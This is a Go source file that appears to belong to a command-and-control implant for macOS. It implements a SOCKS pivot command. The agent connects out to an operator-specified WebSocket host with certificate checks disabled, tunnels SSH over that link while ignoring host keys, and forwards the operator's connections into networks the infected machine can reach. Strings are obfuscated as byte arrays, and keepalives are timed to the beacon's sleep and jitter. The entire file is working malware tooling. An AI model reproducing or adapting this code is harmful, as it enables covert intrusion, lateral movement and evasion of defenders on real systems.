// server/docker/payloads/Darwin/action_socks.go

//go:build darwin
// +build darwin

package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

// Template indices - must match server's common.go
const (
	idxSocksWssFmt            = 140
	idxSocksKeepalive         = 141
	idxSocksDirectTcpip       = 142
	idxSocksActionStart       = 143
	idxSocksActionStop        = 144
	idxSocksErrUnknownChannel = 145
	idxSocksErrLimitReached   = 146
)

// Minimal fallback byte arrays (only used if template missing)
var (
	fallbackStart     = string([]byte{0x73, 0x74, 0x61, 0x72, 0x74})                                                                                           // start
	fallbackStop      = string([]byte{0x73, 0x74, 0x6f, 0x70})                                                                                                 // stop
	fallbackDirectTcp = string([]byte{0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x2d, 0x74, 0x63, 0x70, 0x69, 0x70})                                                 // direct-tcpip
	fallbackKeepalive = string([]byte{0x6b, 0x65, 0x65, 0x70, 0x61, 0x6c, 0x69, 0x76, 0x65, 0x40, 0x67, 0x6f, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x6f, 0x72, 0x67}) // keepalive@golang.org
)

type SocksCommand struct {
	wsConn          *websocket.Conn
	sshClient       *ssh.Client
	running         bool
	mu              sync.RWMutex
	activeTunnels   map[string]*TunnelInfo
	tunnelsMu       sync.RWMutex
	maxConnections  int
	currentConns    int
	cleanupShutdown chan struct{}
	tpl             []string
}

// TunnelInfo tracks active SOCKS tunnel connections
type TunnelInfo struct {
	Target       string
	StartTime    time.Time
	LastActivity time.Time
	BytesSent    int64
	BytesRecv    int64
}

// getTpl safely retrieves a template string by index
func (c *SocksCommand) getTpl(idx int) string {
	if c.tpl != nil && idx < len(c.tpl) {
		return c.tpl[idx]
	}
	return ""
}

func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Get the JSON data from the CurrentCommand in context
	var rawData string

	ctx.mu.RLock()
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		rawData = ctx.CurrentCommand.Data
	}
	ctx.mu.RUnlock()

	if rawData == "" {
		return CommandResult{
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Parse socks config with merged template
	var socksData struct {
		Action      string `json:"action"`
		SocksPort   int    `json:"socks_port"`
		WSSPort     int    `json:"wss_port"`
		WSSHost     string `json:"wss_host"`
		Path        string `json:"path"`
		Credentials struct {
			Username string `json:"username"`
			Password string `json:"password"`
			SSHKey   string `json:"ssh_key"`
		} `json:"credentials"`
		// Template fields (merged by server)
		Templates []string `json:"tpl"`
		Version   int      `json:"v"`
		Type      int      `json:"t"`
	}

	if err := json.Unmarshal([]byte(rawData), &socksData); err != nil {
		return CommandResult{
			Error:       err,
			ErrorString: Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store templates
	c.tpl = socksData.Templates

	// Get action strings from template
	actionStart := c.getTpl(idxSocksActionStart)
	if actionStart == "" {
		actionStart = fallbackStart
	}
	actionStop := c.getTpl(idxSocksActionStop)
	if actionStop == "" {
		actionStop = fallbackStop
	}

	switch socksData.Action {
	case actionStart:
		// Configure dialer with TLS settings
		dialer := websocket.Dialer{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			HandshakeTimeout:  10 * time.Second,
			EnableCompression: false,
		}

		// Build WebSocket URL using template format
		wssFmt := c.getTpl(idxSocksWssFmt)
		if wssFmt == "" {
			wssFmt = "wss://%s:%d%s"
		}
		wsURL := fmt.Sprintf(wssFmt,
			socksData.WSSHost,
			socksData.WSSPort,
			socksData.Path,
		)

		wsConn, resp, err := dialer.Dial(wsURL, nil)
		if err != nil {
			if resp != nil {
				_, _ = io.ReadAll(resp.Body)
				resp.Body.Close()
			}
			return CommandResult{
				Error:       err,
				ErrorString: Err(E12),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Configure SSH client
		sshConfig := &ssh.ClientConfig{
			User: socksData.Credentials.Username,
			Auth: []ssh.AuthMethod{
				ssh.Password(socksData.Credentials.Password),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         10 * time.Second,
		}

		// Add SSH key authentication if provided
		if socksData.Credentials.SSHKey != "" {
			keyBytes, err := base64.StdEncoding.DecodeString(socksData.Credentials.SSHKey)
			if err == nil {
				signer, err := ssh.ParsePrivateKey(keyBytes)
				if err == nil {
					sshConfig.Auth = append(sshConfig.Auth, ssh.PublicKeys(signer))
				}
			}
		}

		// Wrap WebSocket connection for SSH
		wrapped := &wsConnWrapper{conn: wsConn}
		sshConn, chans, reqs, err := ssh.NewClientConn(wrapped, "", sshConfig)
		if err != nil {
			wsConn.Close()
			return CommandResult{
				Error:       err,
				ErrorString: Err(E12),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Store connections before creating client
		c.mu.Lock()
		c.wsConn = wsConn
		c.running = true
		c.activeTunnels = make(map[string]*TunnelInfo)
		c.maxConnections = 50 // Configurable limit
		c.currentConns = 0
		c.cleanupShutdown = make(chan struct{})
		c.mu.Unlock()

		// Start cleanup goroutine for stale connections
		go c.cleanupStaleTunnels()

		// Handle incoming channel requests (for forwarding)
		go c.handleChannels(chans)

		// Handle global requests
		go ssh.DiscardRequests(reqs)

		// Keep SSH connection alive (don't create a client that consumes channels)
		go c.keepAlive(sshConn)

		return CommandResult{
			Output:      SuccCtx(S4, strconv.Itoa(socksData.SocksPort)),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case actionStop:
		c.mu.Lock()
		if c.cleanupShutdown != nil {
			close(c.cleanupShutdown)
		}
		if c.sshClient != nil {
			c.sshClient.Close()
		}
		if c.wsConn != nil {
			c.wsConn.Close()
		}
		c.running = false
		c.mu.Unlock()

		return CommandResult{
			Output:      Succ(S5),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	default:
		return CommandResult{
			Error:       fmt.Errorf(ErrCtx(E21, socksData.Action)),
			ErrorString: ErrCtx(E21, socksData.Action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
	keepaliveStr := c.getTpl(idxSocksKeepalive)
	if keepaliveStr == "" {
		keepaliveStr = fallbackKeepalive
	}

	for {
		c.mu.RLock()
		running := c.running
		c.mu.RUnlock()

		if !running {
			break
		}

		// Calculate dynamic keepalive interval based on current sleep/jitter
		keepaliveInterval := c.calculateKeepaliveInterval()
		time.Sleep(keepaliveInterval)

		// Send keepalive request
		_, _, err := sshConn.SendRequest(keepaliveStr, true, nil)
		if err != nil {
			// Trigger cleanup on connection failure
			c.mu.Lock()
			c.running = false
			if c.wsConn != nil {
				c.wsConn.Close()
			}
			c.mu.Unlock()
			break
		}
	}
}

// calculateKeepaliveInterval dynamically calculates keepalive interval
// based on current sleep/jitter to adapt to agent callback rate
func (c *SocksCommand) calculateKeepaliveInterval() time.Duration {
	const (
		defaultInterval = 30 * time.Second
		minInterval     = 10 * time.Second
		maxInterval     = 120 * time.Second
	)

	// Parse current sleep value (can change during runtime)
	sleepSeconds := 60
	if parsedSleep, err := strconv.Atoi(sleep); err == nil && parsedSleep > 0 {
		sleepSeconds = parsedSleep
	}

	// Parse current jitter value (can change during runtime)
	jitterPercent := 10.0
	if parsedJitter, err := strconv.ParseFloat(jitter, 64); err == nil && parsedJitter >= 0 {
		jitterPercent = parsedJitter
	}

	// Calculate average callback interval: sleep * (1 + jitter/200)
	avgCallbackInterval := float64(sleepSeconds) * (1.0 + jitterPercent/200.0)

	// Set keepalive to half the callback interval
	keepaliveInterval := time.Duration(avgCallbackInterval/2.0) * time.Second

	// Enforce bounds
	if keepaliveInterval < minInterval {
		return minInterval
	}
	if keepaliveInterval > maxInterval {
		return maxInterval
	}

	return keepaliveInterval
}

// cleanupStaleTunnels periodically removes stale tunnel connections
func (c *SocksCommand) cleanupStaleTunnels() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			now := time.Now()
			c.tunnelsMu.Lock()

			for connID, info := range c.activeTunnels {
				// Remove tunnels idle for more than 5 minutes
				if now.Sub(info.LastActivity) > 5*time.Minute {
					delete(c.activeTunnels, connID)
					c.mu.Lock()
					c.currentConns--
					c.mu.Unlock()
				}
			}

			c.tunnelsMu.Unlock()

		case <-c.cleanupShutdown:
			return
		}
	}
}

func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
	for newChannel := range chans {
		go c.handleChannelOpen(newChannel)
	}
}

func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
	directTcpStr := c.getTpl(idxSocksDirectTcpip)
	if directTcpStr == "" {
		directTcpStr = fallbackDirectTcp
	}

	unknownChanStr := c.getTpl(idxSocksErrUnknownChannel)
	if unknownChanStr == "" {
		unknownChanStr = "unknown channel type"
	}

	connLimitStr := c.getTpl(idxSocksErrLimitReached)
	if connLimitStr == "" {
		connLimitStr = "connection limit reached"
	}

	if newChannel.ChannelType() != directTcpStr {
		newChannel.Reject(ssh.UnknownChannelType, unknownChanStr)
		return
	}

	// Check connection limit
	c.mu.Lock()
	if c.currentConns >= c.maxConnections {
		c.mu.Unlock()
		newChannel.Reject(ssh.ResourceShortage, connLimitStr)
		return
	}
	c.currentConns++
	c.mu.Unlock()

	// Ensure we decrement counter on exit
	defer func() {
		c.mu.Lock()
		c.currentConns--
		c.mu.Unlock()
	}()

	// Parse the forwarding request
	var req struct {
		DestAddr   string
		DestPort   uint32
		OriginAddr string
		OriginPort uint32
	}

	if err := ssh.Unmarshal(newChannel.ExtraData(), &req); err != nil {
		newChannel.Reject(ssh.ConnectionFailed, Err(E18))
		return
	}

	// The DestAddr contains the target address (host:port)
	target := req.DestAddr

	// Connect to the target with timeout
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		newChannel.Reject(ssh.ConnectionFailed, Err(E12))
		return
	}

	// Accept the channel
	channel, requests, err := newChannel.Accept()
	if err != nil {
		targetConn.Close()
		return
	}

	// Track this tunnel
	connID := fmt.Sprintf("%s_%d", target, time.Now().UnixNano())
	c.tunnelsMu.Lock()
	c.activeTunnels[connID] = &TunnelInfo{
		Target:       target,
		StartTime:    time.Now(),
		LastActivity: time.Now(),
		BytesSent:    0,
		BytesRecv:    0,
	}
	c.tunnelsMu.Unlock()

	// Cleanup tunnel tracking on exit
	defer func() {
		c.tunnelsMu.Lock()
		delete(c.activeTunnels, connID)
		c.tunnelsMu.Unlock()
	}()

	// Handle channel requests
	go ssh.DiscardRequests(requests)

	// Create error channel for propagation between goroutines
	errChan := make(chan error, 2)
	done := make(chan struct{})

	// Proxy data between channel and target
	var wg sync.WaitGroup
	wg.Add(2)

	// Channel -> Target
	go func() {
		defer wg.Done()
		_, err := c.copyWithTimeout(targetConn, channel, connID, true)
		if err != nil && err != io.EOF {
			select {
			case errChan <- err:
			default:
			}
		}
		// Close write side to signal EOF to target
		if tcpConn, ok := targetConn.(*net.TCPConn); ok {
			tcpConn.CloseWrite()
		}
	}()

	// Target -> Channel
	go func() {
		defer wg.Done()
		_, err := c.copyWithTimeout(channel, targetConn, connID, false)
		if err != nil && err != io.EOF {
			select {
			case errChan <- err:
			default:
			}
		}
		// Close write side to signal EOF to channel
		channel.CloseWrite()
	}()

	// Monitor for errors and force close on first error
	go func() {
		select {
		case <-errChan:
			// Error occurred, force close both connections
			targetConn.Close()
			channel.Close()
		case <-done:
			// Normal completion
		}
	}()

	wg.Wait()
	close(done)
	targetConn.Close()
	channel.Close()
}

// copyWithTimeout copies data with timeout enforcement and activity tracking
func (c *SocksCommand) copyWithTimeout(dst io.Writer, src io.Reader, connID string, isSend bool) (int64, error) {
	const (
		bufferSize  = 32 * 1024 // 32KB buffer
		idleTimeout = 5 * time.Minute
		updateEvery = 64 * 1024 // Update activity every 64KB
	)

	buf := make([]byte, bufferSize)
	var written int64
	var sinceLastUpdate int64

	for {
		// Set read deadline for idle timeout
		if conn, ok := src.(net.Conn); ok {
			conn.SetReadDeadline(time.Now().Add(idleTimeout))
		}

		nr, err := src.Read(buf)
		if nr > 0 {
			nw, ew := dst.Write(buf[0:nr])
			if nw > 0 {
				written += int64(nw)
				sinceLastUpdate += int64(nw)

				// Update activity tracking periodically
				if sinceLastUpdate >= updateEvery {
					c.tunnelsMu.Lock()
					if info, exists := c.activeTunnels[connID]; exists {
						info.LastActivity = time.Now()
						if isSend {
							info.BytesSent += sinceLastUpdate
						} else {
							info.BytesRecv += sinceLastUpdate
						}
					}
					c.tunnelsMu.Unlock()
					sinceLastUpdate = 0
				}
			}
			if ew != nil {
				return written, ew
			}
			if nr != nw {
				return written, io.ErrShortWrite
			}
		}
		if err != nil {
			// Final activity update
			if sinceLastUpdate > 0 {
				c.tunnelsMu.Lock()
				if info, exists := c.activeTunnels[connID]; exists {
					info.LastActivity = time.Now()
					if isSend {
						info.BytesSent += sinceLastUpdate
					} else {
						info.BytesRecv += sinceLastUpdate
					}
				}
				c.tunnelsMu.Unlock()
			}
			return written, err
		}
	}
}

// Buffer pool for WebSocket messages
var wsBufferPool = sync.Pool{
	New: func() interface{} {
		buf := make([]byte, 0, 32*1024)
		return &buf
	},
}

// WebSocket wrapper to implement net.Conn interface
type wsConnWrapper struct {
	conn        *websocket.Conn
	buf         []byte
	bufFromPool bool
}

func (w *wsConnWrapper) Read(b []byte) (n int, err error) {
	if len(w.buf) == 0 {
		_, message, err := w.conn.ReadMessage()
		if err != nil {
			return 0, err
		}

		const largeMessageThreshold = 64 * 1024
		if len(message) > largeMessageThreshold {
			if w.bufFromPool && cap(w.buf) > 0 {
				emptyBuf := w.buf[:0]
				wsBufferPool.Put(&emptyBuf)
				w.bufFromPool = false
			}
			w.buf = message
		} else {
			if !w.bufFromPool {
				bufPtr := wsBufferPool.Get().(*[]byte)
				w.buf = (*bufPtr)[:0]
				w.bufFromPool = true
			}
			w.buf = append(w.buf[:0], message...)
		}
	}

	n = copy(b, w.buf)
	w.buf = w.buf[n:]

	if len(w.buf) == 0 && w.bufFromPool {
		emptyBuf := w.buf[:0]
		wsBufferPool.Put(&emptyBuf)
		w.bufFromPool = false
		w.buf = nil
	}

	return n, nil
}

func (w *wsConnWrapper) Write(b []byte) (n int, err error) {
	err = w.conn.WriteMessage(websocket.BinaryMessage, b)
	if err != nil {
		return 0, err
	}
	return len(b), nil
}

func (w *wsConnWrapper) Close() error {
	return w.conn.Close()
}

func (w *wsConnWrapper) LocalAddr() net.Addr {
	return w.conn.LocalAddr()
}

func (w *wsConnWrapper) RemoteAddr() net.Addr {
	return w.conn.RemoteAddr()
}

func (w *wsConnWrapper) SetDeadline(t time.Time) error {
	if err := w.conn.SetReadDeadline(t); err != nil {
		return err
	}
	return w.conn.SetWriteDeadline(t)
}

func (w *wsConnWrapper) SetReadDeadline(t time.Time) error {
	return w.conn.SetReadDeadline(t)
}

func (w *wsConnWrapper) SetWriteDeadline(t time.Time) error {
	return w.conn.SetWriteDeadline(t)
}
